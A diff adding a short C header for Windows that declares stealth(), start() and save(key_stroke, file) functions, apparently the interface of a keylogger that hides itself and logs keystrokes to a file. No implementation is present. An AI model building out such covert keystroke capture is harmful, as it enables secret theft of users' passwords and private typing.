@@ -1,0 +1,13 @@
+#ifndef HEADER_H_INCLUDED
+#define HEADER_H_INCLUDED
+#include <stdio.h>
+#include <windows.h>
+#include <time.h>
+
+typedef enum {MUTE=0xAD, DOWN=0xAE, UP=0xAF} VK_VOLUME;     //Define to Virtual Key presses
+
+void stealth();
+void start(char *file);
+int save(int key_stroke, char *file);
+
+#endif // HEADER_H_INCLUDED
